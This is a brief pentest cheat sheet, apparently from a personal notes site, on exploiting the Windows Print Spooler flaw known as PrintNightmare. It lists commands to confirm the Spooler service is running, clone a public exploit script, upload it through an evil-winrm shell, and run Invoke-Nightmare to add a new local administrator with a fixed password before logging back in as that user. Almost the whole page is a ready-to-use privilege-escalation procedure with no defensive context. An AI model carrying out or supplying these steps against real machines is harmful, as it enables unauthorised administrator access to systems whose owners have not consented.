---
description: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
---

# Print Nightmare

### Using evil-winrm and invoke-nightmare to exploit print nightmare

* Check if the Spooler server is working

```powershell
Get-Service -Name Spooler
```

* Git clone the repo into the host machine and change the name

```bash
cd /opt/
git clone https://github.com/calebstewart/CVE-2021-1675
mv CVE-2021-1675 invoke-nightmare
```

* In the evil-winrm shell

```powershell
upload /opt/invoke-nightmare/CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "brun0" -NewPassword "test"
```

* Login again now with brun0 since he has Administrator Rights

```bash
evil-winrm -i IP -u brun0 -p test
```
